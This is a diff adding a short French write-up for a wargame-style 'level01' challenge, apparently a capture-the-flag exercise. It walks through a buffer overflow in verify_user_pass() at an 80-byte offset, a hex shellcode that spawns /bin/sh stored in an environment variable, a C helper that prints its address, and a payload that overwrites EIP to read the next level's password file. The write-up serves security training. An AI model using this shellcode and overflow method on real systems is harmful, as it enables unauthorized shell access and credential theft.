@@ -1,0 +1,28 @@
+Une fois le code decompile, on remarque que ecrire le bon identifiant/mot de passe
+ne donne rien. Cependant, on remarque que l'on peut faire un buffer overflow depuis
+la fonction verify_user_pass(). A l'aide d'un offset generator pour buffer overflow
+on voit que le segfault arrive au bout de 80 caracteres. Notre but va donc etre
+de toucher l'eip et le faire pointer vers un code qui lance un shell. Pour cela
+nous allons creer une variable d'environnement avec notre SHELLCODE a l'interieur:
+
+export EXPLOIT=`python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'`
+
+maintenant nous allons recuperer son adresse avec un simple programme comme ceci:
+
+$ echo '#include <stdio.h>
+#include <stdlib.h>
+int main(int argc, char *argv[])
+{
+	char* ptr = getenv("EXPLOIT");
+	printf("%p\n", ptr);
+}' > /tmp/prog.c
+$ gcc -m32 /tmp/prog.c -o /tmp/prog
+$ /tmp/prog
+0x????????
+
+(le nom /tmp/prog est important car il fait autant de lettre que ./level01, c'est
+pour avoir le meme environnement lors de l'execution).
+
+une fois cette adresse recuperer, on peut creer facilement notre payload:
+(python -c 'print "data_wil\n" + "A"*80 + "\x??\x??\x??\x??"' ; cat) | ./level1
+cat /home/users/level01/.pass
